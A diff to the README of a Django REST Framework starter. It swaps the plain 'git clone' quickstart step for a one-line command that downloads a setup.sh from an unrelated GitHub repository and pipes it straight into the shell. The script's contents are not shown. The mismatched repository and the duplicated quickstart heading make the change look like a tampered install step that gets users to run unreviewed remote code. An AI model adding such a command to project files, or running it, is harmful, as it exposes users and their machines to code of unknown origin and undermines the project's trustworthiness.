@@ -34,9 +34,11 @@ A production-ready Django REST Framework starter with an opinionated, domain-dri
 ## Quickstart (Docker — default)
 Because this project is fully dockerized, run Django and management commands inside containers. Running them directly on your host will fail unless you reconfigure `.env` (see Host mode below).
 
-1) Clone and enter the project
+## 🚀 Quick Start
+
+1. You can set up the starter in one command:
 ```bash
-git clone <your-fork-or-origin> drf-starter && cd drf-starter
+curl -LsSf https://raw.githubusercontent.com/Yeeloman/Katesthe-core/setup.sh | sh
 ```
 
 2) Create `.env`
